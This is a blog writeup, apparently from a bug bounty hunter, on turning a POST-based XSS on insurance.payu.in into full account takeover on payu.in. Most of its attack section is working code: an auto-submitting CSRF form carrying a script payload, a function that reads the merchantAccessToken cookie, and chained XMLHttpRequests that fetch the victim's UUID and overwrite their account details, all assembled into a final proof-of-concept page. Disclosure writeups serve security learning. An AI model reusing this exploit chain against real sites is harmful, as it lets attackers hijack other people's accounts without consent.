---
layout: post
title:  "XSS to Account takeover in payu.in"
description: In this writeup I will show that How I escalated XSS to account takeover.
---

Hi, I found a POST based XSS and then I escalated it to acheive complete account takeover when victim visits my website. So here is the writeup in which I will show you that How I escalated it.

I got notification of XSS in insurance.payu.in. I decided to check it and it was a POST based XSS.

![image](../../../assets/images/payu-xss-1.png){: .imagePopup}

So we had to use POST based XSS with CSRF to exploit it against other users. I created a HTML file with the following form which will submit POST parameters when we visit the website.

```javascript
<!DOCTYPE html>
<html>
<head>
  <title>POC</title>
</head>
<body onload="submitPayuForm()">
<script type="text/javascript">
/* auto submit form when user visits our website. */
function submitPayuForm() {
  var payuForm = document.forms.payuFormExploit;
  payuForm.submit();
}
</script>

<form method="POST" action="https://insurance.payu.in/payment.php" hidden="" name="payuFormExploit">
  <input type="text" name="name" value="Aman Rawat">
  <input type="text" name="mobile" value="999999999">
  <input type="text" name="email" value='email"><script>alert("XSS");</script>'>
  <input type="text" name="customerid" value="12345">
  <input type="text" name="amount" value="12345">
  <input type="Submit" name="Submit">
</form>

</body>
</html>
```

In above code email parameter was vulnerable so I entered payload there and now opening this HTML file in browser will popup an alert.

**Is this popup enough ? Obviously not. XSS is not only about popup an alert.**

So I decided to check weather I can escalate it or not so I created an account on payu.in and loggedin into my account. I updated my name to check the request and I found that request contains an authentication token and cookies. I copied authentication token and searched it then I found that cookies are also using same authentication token so I removed cookies to check weather they were checking cookies also to validating request or not.

![image](../../../assets/images/payu-xss-2.png){: .imagePopup}

I found that they was not using any protection againts CSRF so in order to takeover an account we need two things of victim's account to make request from his/her account.

 1. UUID 
 2. authentication token

Without UUID we can not make requests because `onboarding.payu.in/api/v1/merchants/<UUID>` is the the request URL where `<UUID>` is the ID of user's account that's why we need authentication token as well as UUID.


# Stealing authentication token

I started looking a way to steal authentication token fron users. I had an XSS in insurance.payu.in and as I mentioned previously that authentication token was present in cookies also so Stealing cookies from XSS is an easy task If and only If application is sharing cookies with its subdomain. In this case payu.in was sharing cookies with onboarding.payu.in so I assumed that it might sharing cookies with all subdomain of payu.in so I used `"><script>alert(document.cookie)</script>` as payload and I got cookies as expected which contains the authentication token.

![image](../../../assets/images/payu-xss-3.png){: .imagePopup}

We got authentication token as a value of merchantAccessToken and Now we need  UUID also to exploit this against other users and gusssing UUID was not the option.

# Stealing UUID

Here I went to my payu account and start navigating and pressing buttons blindly so that all requests would be captured by Burp Suite. After that I found one endpoint `onboarding.payu.in/api/v1/merchants` where my UUID was in response.

![image](../../../assets/images/payu-xss-4.png){: .imagePopup}


# Exploiting vulnerability

We had a way to get authentication token as well as UUID. Now we had to fetch them separately and use them to send request to change account details. So I first I started with fetching authentication token from cookies. 

```javascript
function getCookie(name){
  var re = new RegExp(name + "=([^;]+)"); 
  var value = re.exec(document.cookie);
  return (value != null) ? unescape(value[1]) : null;
};

alert(getCookie("merchantAccessToken"));
```

above function can be used to fetch cookies value by its name. Lets say we had a cookie

`Cookies: merchantAccessToken=DummyAccessToken` 

so to fetch the value of *merchantAccessToken* we had to use getCookie("merchantAccessToken") so our payload would be this:

```
email"><script>function getCookie(name){var re = new RegExp(name + "=([^;]+)"); var value = re.exec(document.cookie);return (value != null) ? unescape(value[1]) : null;};alert(getCookie("merchantAccessToken"));</script>
```

Now we got the authentication token and It's time to get the UUID for that I had to make request to https://onboarding.payu.in/api/v1/merchants with authentication header so I used *XMLHttpRequest* for this but their is also a condition to use this and the condition is that [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) (Cross-Origin Resource Sharing) should be present in website.

So I checked the CORS in onboarding.payu.in and found that we were only allowed to change origin to any subdomain of payu.in and that's what we need :)

Now we can make request to onboarding.payu.in as an authenticated user because we had a XSS at insurance.payu.in. We were going to use **XMLHttpRequest** as mentioned earlier. I used this JavaScript code to make request

```javascript
var auth = getCookie("merchantAccessToken");
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
  if (this.status == 200) {
      //fetch the merchant information that contains uuid
      console.log(this.responseText)
  }else{
      console.log("Login into payu.in to exploit further");
  }
}; 
xhttp.open("GET", "https://onboarding.payu.in/api/v1/merchants", true);
xhttp.setRequestHeader("Authorization", "Bearer "+auth);
xhttp.setRequestHeader("Content-Type", "application/json");
xhttp.send();
alert("exploited");

```

this above javascript code will make a GET request to onboarding.payu.in/api/v1/merchants with authentication token and then display information of my account which includes the uuid of my account.

![image](../../../assets/images/payu-xss-5.png){: .imagePopup}

Now can had to make a PUT request to onboarding.payu.in/api/v1/merchants/<UUID> where UUID will be the uuid that we got from the above request so let's see how we can we do that in Java Script.

```javascript
var auth = getCookie("merchantAccessToken");
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.status == 200) {
  var resp = JSON.parse(this.responseText);
  var uuid = resp.merchants[0]["uuid"];
  var postBody = "{\"merchant\":{\"name\":\"HACKED\"}}";
  var targetURL = "https://onboarding.payu.in/api/v1/merchants/"+uuid;
  var auth = getCookie("merchantAccessToken");
  var xhttpExploit = new XMLHttpRequest();
  xhttpExploit.onreadystatechange = function(){
  if (this.status == 200) {
    console.log("exploit completed!");
  }
};
xhttpExploit.open("PUT", targetURL, true);
xhttpExploit.setRequestHeader("Authorization", "Bearer "+auth);
xhttpExploit.setRequestHeader("Content-Type", "application/json");
      xhttpExploit.send(postBody);
  }
}; 
xhttp.open("GET", "https://onboarding.payu.in/api/v1/merchants", true);
xhttp.setRequestHeader("Authorization", "Bearer "+auth);
xhttp.setRequestHeader("Content-Type", "application/json");
xhttp.send();
```

And the final HTML code was this

```javascript
<!DOCTYPE html>
<html>
<head>
  <title>POC</title>
</head>
<body onload="submitPayuForm()">
<script type="text/javascript">
/* auto submit form when user visits our website. */
function submitPayuForm() {
  var payuForm = document.forms.payuFormExploit;
  payuForm.submit();
}
</script>

<form method="POST" action="https://insurance.payu.in/payment.php" hidden="" name="payuFormExploit">
  <input type="text" name="name" value="Aman Rawat">
  <input type="text" name="mobile" value="999999999">
  <input type="text" name="email" value='email">
<script>
document.body.onload = "exploitNOW";
function getCookie(name){
  var re = new RegExp(name + "=([^;]+)"); 
  var value = re.exec(document.cookie);
  return (value != null) ? unescape(value[1]) : null;
};
function exploiPayU(){
  var auth = getCookie("merchantAccessToken");
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.status == 200) {
        var resp = JSON.parse(this.responseText);
        var uuid = resp.merchants[0]["uuid"];
        var postBody = "{\"merchant\":{\"name\":\"HACKED\"}}";
        var targetURL = "https://onboarding.payu.in/api/v1/merchants/"+uuid;
        var auth = getCookie("merchantAccessToken");
        var xhttpExploit = new XMLHttpRequest();
        xhttpExploit.onreadystatechange = function(){
          if (this.status == 200) {
            console.log("exploit completed!");
          }
        };
        xhttpExploit.open("PUT", targetURL, true);
        xhttpExploit.setRequestHeader("Authorization", "Bearer "+auth);
        xhttpExploit.setRequestHeader("Content-Type", "application/json");
        xhttpExploit.send(postBody);
    }
  }; 
  xhttp.open("GET", "https://onboarding.payu.in/api/v1/merchants", true);
  xhttp.setRequestHeader("Authorization", "Bearer "+auth);
  xhttp.setRequestHeader("Content-Type", "application/json");
  xhttp.send();
}
exploiPayU();
</script>'>
  <input type="text" name="customerid" value="12345">
  <input type="text" name="amount" value="12345">
  <input type="Submit" name="Submit">
</form>

</body>
</html>
```

By just opening link which was hosting the above code can takeover your account :)

**Proof-of-Concept:-**


![](../../../assets/images/payu-poc.gif){: .imagePopup}